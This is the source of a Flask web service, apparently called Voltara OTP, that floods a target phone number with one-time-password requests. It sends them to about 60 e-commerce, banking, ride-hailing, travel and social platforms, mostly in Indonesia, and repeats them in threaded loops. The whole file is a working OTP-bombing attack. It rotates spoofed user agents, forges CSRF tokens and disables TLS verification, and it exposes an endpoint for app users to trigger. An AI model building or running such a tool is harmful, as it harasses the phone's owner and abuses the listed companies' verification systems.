"""
Voltara OTP Service — Railway deployment
Expose HTTP endpoint, semua user APK hit sini
"""
from flask import Flask, request, jsonify, Response, stream_with_context
import json, ssl, urllib.request, urllib.error, urllib.parse
import random, threading, queue, time

app = Flask(__name__)

_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE

_UAS = [
    'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/124.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/123.0 Mobile Safari/537.36',
    'Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)',
    'okhttp/4.12.0',
]
def _ua(): return random.choice(_UAS)

def _post_json(url, data, headers=None, timeout=12):
    body = json.dumps(data).encode()
    h = {'Content-Type':'application/json','Accept':'application/json','User-Agent':_ua()}
    if headers: h.update(headers)
    req = urllib.request.Request(url, data=body, headers=h, method='POST')
    with urllib.request.urlopen(req, timeout=timeout, context=_ctx) as r:
        return r.status

def _post_form(url, data, headers=None, timeout=12):
    body = data.encode() if isinstance(data, str) else data
    h = {'Content-Type':'application/x-www-form-urlencoded','User-Agent':_ua()}
    if headers: h.update(headers)
    req = urllib.request.Request(url, data=body, headers=h, method='POST')
    with urllib.request.urlopen(req, timeout=timeout, context=_ctx) as r:
        return r.status

def build_platforms(phone, cc):
    p = f"{cc}{phone}"
    csrf = ''.join(random.choices('abcdef0123456789', k=32))
    return [
    # ══ E-COMMERCE ══
    {'name':'Tokopedia','cat':'E-Commerce','emoji':'🛒','fn': lambda:
        _post_form('https://accounts.tokopedia.com/otp/c/page',
        f'phone_number={p}&otp_type=2&msisdn={p}&channel=whatsapp',
        {'User-Agent':'com.tokopedia.tkpd/3.264 (android 14)'})},
    {'name':'Shopee','cat':'E-Commerce','emoji':'🛍️','fn': lambda:
        _post_json('https://shopee.co.id/api/v2/authentication/send_mobile_otp/',
        {'phone_number':p,'country_code':cc,'type':0,'channel':'whatsapp'},
        {'X-Csrftoken':csrf,'Referer':'https://shopee.co.id/','Cookie':f'csrftoken={csrf}'})},
    {'name':'Lazada','cat':'E-Commerce','emoji':'📦','fn': lambda:
        _post_json('https://member.lazada.co.id/user/api/pc/member/send/phone/code',
        {'mobile':phone,'countryCode':cc,'channel':'WHATSAPP'})},
    {'name':'Bukalapak','cat':'E-Commerce','emoji':'🏪','fn': lambda:
        _post_json('https://api.bukalapak.com/v2/users/otp',
        {'phone':p,'type':'whatsapp'})},
    {'name':'Blibli','cat':'E-Commerce','emoji':'🟦','fn': lambda:
        _post_json('https://www.blibli.com/friends/api/customer/auth/mobile/otp/request',
        {'phoneNumber':p,'channel':'WHATSAPP','type':'LOGIN'})},
    {'name':'Zalora','cat':'E-Commerce','emoji':'👗','fn': lambda:
        _post_json('https://www.zalora.co.id/api/v3/auth/otp',
        {'phone':p,'channel':'whatsapp'})},
    {'name':'Sociolla','cat':'E-Commerce','emoji':'💄','fn': lambda:
        _post_json('https://api.sociolla.com/api/v5/auth/mobile/otp',
        {'phone':p,'type':'whatsapp'})},
    # ══ TRANSPORT & FOOD ══
    {'name':'Gojek','cat':'Transport','emoji':'🛺','fn': lambda:
        _post_json('https://consumer-api.gojek.com/api/v4/customers/verifications/otp/phone',
        {'phone_number':p,'channel':'WHATSAPP'},{'X-Appversion':'4.41.0'})},
    {'name':'GoFood','cat':'Food','emoji':'🍜','fn': lambda:
        _post_json('https://consumer-api.gojek.com/api/v4/customers/verifications/otp/phone',
        {'phone_number':p,'channel':'WHATSAPP'},{'X-Appversion':'4.41.0'})},
    {'name':'GoPay','cat':'Finance','emoji':'💚','fn': lambda:
        _post_json('https://consumer-api.gojek.com/api/v4/customers/verifications/otp/phone',
        {'phone_number':p,'channel':'WHATSAPP'},{'X-Appversion':'4.41.0'})},
    {'name':'Grab','cat':'Transport','emoji':'🚕','fn': lambda:
        _post_json('https://api.grab.com/grabid/v1/phone_numbers/otp/generate',
        {'phone':p,'method':'WHATSAPP','service':'CONSUMER'})},
    {'name':'GrabFood','cat':'Food','emoji':'🟢','fn': lambda:
        _post_json('https://api.grab.com/grabid/v1/phone_numbers/otp/generate',
        {'phone':p,'method':'WHATSAPP','service':'CONSUMER'})},
    {'name':'Maxim','cat':'Transport','emoji':'🚗','fn': lambda:
        _post_json('https://taximaxim.com/id/api/auth/sms',
        {'phone':p,'country':'ID','channel':'whatsapp'})},
    {'name':'ShopeeFood','cat':'Food','emoji':'🛵','fn': lambda:
        _post_json('https://shopee.co.id/api/v2/authentication/send_mobile_otp/',
        {'phone_number':p,'country_code':cc,'type':0,'channel':'whatsapp'},
        {'X-Csrftoken':csrf,'Cookie':f'csrftoken={csrf}'})},
    {'name':'InDrive','cat':'Transport','emoji':'🚙','fn': lambda:
        _post_json('https://api.indrive.com/v1/auth/otp',
        {'phone':f'+{p}','channel':'whatsapp'})},
    # ══ FINANCE ══
    {'name':'OVO','cat':'Finance','emoji':'💜','fn': lambda:
        _post_json('https://api.ovo.id/v3/otp/request',
        {'mobile_number':p,'flow':'REGISTER','channel':'whatsapp'},
        {'App-Id':'net.aspire.ovo'})},
    {'name':'DANA','cat':'Finance','emoji':'💙','fn': lambda:
        _post_json('https://m.dana.id/d/ipg/v1.0/registration/request-otp',
        {'phoneNo':p,'bizContent':'{}'})},
    {'name':'LinkAja','cat':'Finance','emoji':'🔴','fn': lambda:
        _post_json('https://account.linkaja.id/api/v2/otp/send',
        {'phone':p,'purpose':'REGISTER','channel':'whatsapp'})},
    {'name':'ShopeePay','cat':'Finance','emoji':'🟠','fn': lambda:
        _post_json('https://shopee.co.id/api/v2/authentication/send_mobile_otp/',
        {'phone_number':p,'country_code':cc,'type':0,'channel':'whatsapp'},
        {'X-Csrftoken':csrf,'Cookie':f'csrftoken={csrf}'})},
    {'name':'Jenius','cat':'Finance','emoji':'🟡','fn': lambda:
        _post_json('https://api.jenius.com/api/v2/user/otp/request',
        {'phoneNumber':p,'type':'REGISTER','channel':'WHATSAPP'})},
    {'name':'Flip','cat':'Finance','emoji':'💳','fn': lambda:
        _post_json('https://api.flip.id/v2/auth/otp/send',
        {'phone':p,'channel':'whatsapp'})},
    {'name':'Kredivo','cat':'Finance','emoji':'🤝','fn': lambda:
        _post_json('https://api.kredivo.com/kredivo/v2/user/verify/phone',
        {'phone_number':p,'channel':'whatsapp'})},
    {'name':'Akulaku','cat':'Finance','emoji':'💰','fn': lambda:
        _post_json('https://member.akulaku.com/user/phone/verifyCode/send',
        {'phone':p,'phoneArea':cc,'type':'1','channel':'whatsapp'})},
    {'name':'Koinworks','cat':'Finance','emoji':'🏦','fn': lambda:
        _post_json('https://koinworks.com/api/users/mobile_phones/confirm',
        {'mobile_phone':p,'country_code':cc,'channel':'whatsapp'})},
    # ══ BANKING ══
    {'name':'BCA Mobile','cat':'Banking','emoji':'🏦','fn': lambda:
        _post_json('https://api.klikbca.com/authentication/otp',
        {'phone':p,'channel':'whatsapp','purpose':'LOGIN'})},
    {'name':'BRI','cat':'Banking','emoji':'🏧','fn': lambda:
        _post_json('https://api.bri.co.id/v2/auth/otp/send',
        {'phone':p,'channel':'WHATSAPP','type':'LOGIN'})},
    {'name':'Mandiri','cat':'Banking','emoji':'💛','fn': lambda:
        _post_json('https://api.bankmandiri.co.id/v1/auth/otp',
        {'phone':p,'method':'whatsapp'})},
    {'name':'BNI','cat':'Banking','emoji':'🟠','fn': lambda:
        _post_json('https://api.bni.co.id/v2/auth/otp/send',
        {'phone':p,'channel':'WHATSAPP'})},
    {'name':'BSI','cat':'Banking','emoji':'🟢','fn': lambda:
        _post_json('https://api.bankbsi.co.id/v1/auth/otp',
        {'phone':p,'channel':'WHATSAPP'})},
    {'name':'CIMB Niaga','cat':'Banking','emoji':'🔵','fn': lambda:
        _post_json('https://api.cimbniaga.co.id/v1/otp/request',
        {'phone':p,'channel':'whatsapp'})},
    {'name':'Allo Bank','cat':'Banking','emoji':'🟢','fn': lambda:
        _post_json('https://api.allobank.com/v1/users/otp',
        {'phoneNumber':p,'channel':'whatsapp'})},
    {'name':'Sea Bank','cat':'Banking','emoji':'🌊','fn': lambda:
        _post_json('https://api.seamoney.com/v1/auth/otp',
        {'phone':p,'channel':'WHATSAPP'})},
    {'name':'Jago','cat':'Banking','emoji':'🐆','fn': lambda:
        _post_json('https://api.jago.com/api/v2/users/otp',
        {'phoneNumber':p,'channel':'WHATSAPP'})},
    # ══ TRAVEL ══
    {'name':'Traveloka','cat':'Travel','emoji':'✈️','fn': lambda:
        _post_json('https://api.traveloka.com/v2/user/json/account-service/authentication/requestOtp',
        {'phoneNumber':p,'otpType':'LOGIN','currencyCode':'IDR','channel':'WHATSAPP'},
        {'X-Appid':'com.traveloka.android'})},
    {'name':'Tiket.com','cat':'Travel','emoji':'🎫','fn': lambda:
        _post_json('https://api.tiket.com/account/otp/send',
        {'phone':p,'sendType':'WHATSAPP'})},
    {'name':'Pegipegi','cat':'Travel','emoji':'🏨','fn': lambda:
        _post_json('https://www.pegipegi.com/api/user/send_otp/',
        {'phone_number':p,'type':'whatsapp'})},
    {'name':'KAI Access','cat':'Travel','emoji':'🚂','fn': lambda:
        _post_json('https://api.kai.id/v2/auth/otp',
        {'phone':p,'channel':'WHATSAPP'})},
    {'name':'Airbnb','cat':'Travel','emoji':'🏠','fn': lambda:
        _post_json('https://api.airbnb.com/v2/authentications',
        {'phone':f'+{p}','method':'whatsapp'},
        {'X-Airbnb-Api-Key':'d306zoyjsyarp7ifhu67rjxn52tv0t20'})},
    {'name':'Booking.com','cat':'Travel','emoji':'🌐','fn': lambda:
        _post_json('https://secure.booking.com/json/mobile/getotpcode',
        {'phone':p,'type':'whatsapp'})},
    {'name':'Agoda','cat':'Travel','emoji':'🏩','fn': lambda:
        _post_json('https://api.agoda.com/v1/auth/otp',
        {'phone':p,'channel':'WHATSAPP'})},
    # ══ HEALTH ══
    {'name':'Halodoc','cat':'Health','emoji':'💊','fn': lambda:
        _post_json('https://www.halodoc.com/api/auth/login/phone/code',
        {'phoneNumber':p,'countryCode':cc,'channel':'whatsapp'})},
    {'name':'Alodokter','cat':'Health','emoji':'🏥','fn': lambda:
        _post_json('https://api.alodokter.com/api/v1/users/otp',
        {'phone_number':p,'country_code':cc,'channel':'whatsapp'})},
    {'name':'KlikDokter','cat':'Health','emoji':'🩺','fn': lambda:
        _post_json('https://api.klikdokter.com/api/v1/auth/otp',
        {'phone':p,'type':'whatsapp'})},
    {'name':'SehatQ','cat':'Health','emoji':'❤️','fn': lambda:
        _post_json('https://api.sehatq.com/v2/auth/otp',
        {'phone':p,'channel':'WHATSAPP'})},
    # ══ GAMING ══
    {'name':'Mobile Legends','cat':'Gaming','emoji':'⚔️','fn': lambda:
        _post_json('https://account.mobilelegends.com/base/bindSmsSend',
        {'mobile':p,'area_code':cc,'type':0,'channel':'whatsapp'})},
    {'name':'Garena','cat':'Gaming','emoji':'🎮','fn': lambda:
        _post_json('https://auth.garena.com/api/phone/send_otp',
        {'mobile':p,'country_code':cc,'channel':'whatsapp'})},
    {'name':'Codashop','cat':'Gaming','emoji':'💎','fn': lambda:
        _post_json('https://order-sg.codashop.com/api/v2/otp/request-otp',
        {'msisdn':p,'countryCode':cc,'channel':'WHATSAPP'},
        {'X-Requested-With':'XMLHttpRequest'})},
    {'name':'UniPin','cat':'Gaming','emoji':'🎯','fn': lambda:
        _post_json('https://www.unipin.com/id/api/v1/phone/otp',
        {'phone':p,'type':'whatsapp'})},
    {'name':'VCGamers','cat':'Gaming','emoji':'🕹️','fn': lambda:
        _post_json('https://api.vcgamers.com/v2/auth/otp/send',
        {'phone':p,'channel':'whatsapp'})},
    # ══ STREAMING ══
    {'name':'Vidio','cat':'Streaming','emoji':'📺','fn': lambda:
        _post_json('https://www.vidio.com/api/v2/users/auth/phone',
        {'msisdn':p,'type':'whatsapp'})},
    {'name':'WeTV','cat':'Streaming','emoji':'🎞️','fn': lambda:
        _post_json('https://wetv.vip/en/api/user/sendAuthCode',
        {'phone':p,'areaCode':cc,'purpose':'REGISTER','channel':'whatsapp'})},
    {'name':'iQIYI','cat':'Streaming','emoji':'🎬','fn': lambda:
        _post_json('https://passport.iqiyi.com/apis/user/mobileCode.action',
        {'mobileNum':p,'type':'whatsapp','lang':'id'})},
    {'name':'Tix.id','cat':'Streaming','emoji':'🎟️','fn': lambda:
        _post_json('https://api.tix.id/v1/auth/otp',
        {'phone':p,'type':'whatsapp'})},
    # ══ LOGISTIK ══
    {'name':'J&T Express','cat':'Logistik','emoji':'📦','fn': lambda:
        _post_json('https://www.jet.co.id/api/v1/auth/sendOtp',
        {'phone':p,'type':'WHATSAPP'})},
    {'name':'AnterAja','cat':'Logistik','emoji':'🛻','fn': lambda:
        _post_json('https://api.anteraja.id/auth/otp/request',
        {'phone':p,'type':'WHATSAPP'})},
    {'name':'SiCepat','cat':'Logistik','emoji':'⚡','fn': lambda:
        _post_json('https://api.sicepat.com/v1/auth/otp',
        {'phone':p,'channel':'whatsapp'})},
    {'name':'JNE','cat':'Logistik','emoji':'🚚','fn': lambda:
        _post_json('https://www.jne.co.id/api/auth/otp',
        {'phone':p,'channel':'whatsapp'})},
    # ══ SOCIAL ══
    {'name':'TikTok','cat':'Social','emoji':'🎵','fn': lambda:
        _post_form('https://api16-normal-c-useast1a.tiktokv.com/passport/mobile/send_code/',
        f'mobile={urllib.parse.quote(p)}&type=0&version=0&aid=1233&channel=whatsapp')},
    {'name':'Line','cat':'Social','emoji':'💚','fn': lambda:
        _post_json('https://gw.line.naver.jp/api/v1/sms/verify',
        {'phone':f'+{p}','channel':'whatsapp'})},
    ]

def run_one(plat):
    try:
        status = plat['fn']()
        ok = 200 <= status < 500
        return {'name':plat['name'],'emoji':plat['emoji'],'cat':plat['cat'],
                'ok':ok,'status':status,'msg':'OK' if ok else f'HTTP {status}'}
    except urllib.error.HTTPError as e:
        ok = 200 <= e.code < 500
        return {'name':plat['name'],'emoji':plat['emoji'],'cat':plat['cat'],
                'ok':ok,'status':e.code,'msg':'OK' if ok else f'HTTP {e.code}'}
    except Exception as e:
        return {'name':plat['name'],'emoji':plat['emoji'],'cat':plat['cat'],
                'ok':False,'status':0,'msg':str(e)[:50]}

# ── Endpoints ─────────────────────────────────────────────────────────────────

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status':'ok','service':'Voltara OTP Railway','platforms':60})

@app.route('/platforms', methods=['GET'])
@app.route('/otp/platforms', methods=['GET'])
def platforms():
    dummy = build_platforms('000', '62')
    plat_list = [{'name':p['name'],'cat':p['cat'],'emoji':p['emoji']} for p in dummy]
    return jsonify({
        'platforms': plat_list,
        'total': len(plat_list),
        'proxy_enabled': False,
        'proxy_count': 0,
    })

@app.route('/send', methods=['POST'])
@app.route('/otp/send', methods=['POST'])
def send_otp_handler():
    """
    Body: { phone, cc, count, workers, platforms }
    Stream response NDJSON (newline delimited JSON)
    """
    data = request.get_json() or {}
    phone   = str(data.get('phone','')).lstrip('0').lstrip('+')
    cc      = str(data.get('cc','62'))
    count   = min(int(data.get('count',1)), 20)
    workers = min(int(data.get('workers',10)), 30)
    sel     = data.get('platforms', None)  # None = all

    if not phone:
        return jsonify({'error':'phone required'}), 400

    def generate():
        from concurrent.futures import ThreadPoolExecutor
        platforms = build_platforms(phone, cc)
        if sel and sel != 'all':
            sel_set = set(sel) if isinstance(sel, list) else set(sel.split(','))
            platforms = [p for p in platforms if p['name'] in sel_set]

        total = len(platforms)
        sent = ok = fail = 0

        yield json.dumps({'type':'start','phone':f'+{cc}{phone}',
            'total':total,'count':count,'workers':workers}) + '\n'

        for loop in range(count):
            yield json.dumps({'type':'loop','loop':loop+1,'total':count}) + '\n'
            with ThreadPoolExecutor(max_workers=workers) as ex:
                for result in ex.map(run_one, platforms):
                    sent += 1
                    if result['ok']: ok += 1
                    else: fail += 1
                    result.update({'type':'log','icon':'✅' if result['ok'] else '❌',
                        'sent':sent,'ok':ok,'fail':fail})
                    yield json.dumps(result, ensure_ascii=False) + '\n'
            if loop < count - 1:
                time.sleep(0.3)

        yield json.dumps({'type':'done','sent':sent,'ok':ok,'fail':fail}) + '\n'

    return Response(stream_with_context(generate()),
        mimetype='application/x-ndjson',
        headers={'X-Accel-Buffering':'no','Cache-Control':'no-cache'})

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
